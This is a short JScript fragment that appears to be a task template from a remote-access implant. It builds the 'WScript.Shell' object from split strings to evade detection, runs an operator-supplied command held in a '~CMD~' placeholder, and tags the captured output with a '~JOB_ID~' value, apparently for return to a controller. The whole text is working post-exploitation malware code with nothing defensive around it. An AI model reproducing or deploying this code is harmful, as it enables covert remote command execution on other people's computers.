job = function () {
    r = new ActiveXObject("WScrip" + "t.She" + "ll").Exec("~CMD~");
    a = "";
    while (!r.StdOut.AtEndOfStream) {
        a = r.StdOut.ReadAll();
    }
    return a;
}
c = "~JOB_ID~" + "|" + job();